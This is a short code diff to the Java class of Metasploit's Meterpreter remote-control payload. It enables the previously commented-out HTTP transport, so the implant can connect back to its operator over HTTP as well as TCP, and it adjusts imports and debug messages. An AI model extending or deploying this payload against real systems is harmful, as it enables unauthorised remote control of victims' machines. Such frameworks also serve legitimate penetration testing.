@@ -8,9 +8,11 @@ import java.io.EOFException;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.io.PrintStream;
+
+import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLClassLoader;
-import java.net.URLConnection;
+
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
@@ -44,7 +46,7 @@ public class Meterpreter {
     private long sessionExpiry;
 
 
-    private void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) {
+    private void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) throws MalformedURLException {
         System.out.println("msf : Parsing configuration");
         // socket handle is 4 bytes, followed by exit func, both of
         // which we ignore.
@@ -72,7 +74,7 @@ public class Meterpreter {
             if (url.startsWith("tcp")) {
                 t = new TcpTransport(url);
             } else {
-                //t = new HttpTransport(url);
+                t = new HttpTransport(url);
             }
 
             csr = t.parseConfig(configuration, csr);
@@ -175,6 +177,7 @@ public class Meterpreter {
     public void startExecuting() throws Exception {
         System.out.println("msf : kicking off execution");
         while (!this.hasSessionExpired() && this.transports.current() != null) {
+            System.out.println("msf : initialising transport");
             if (!this.transports.current().connect(this)) {
                 System.out.println("msf : connection failed, going to next transport");
                 continue;
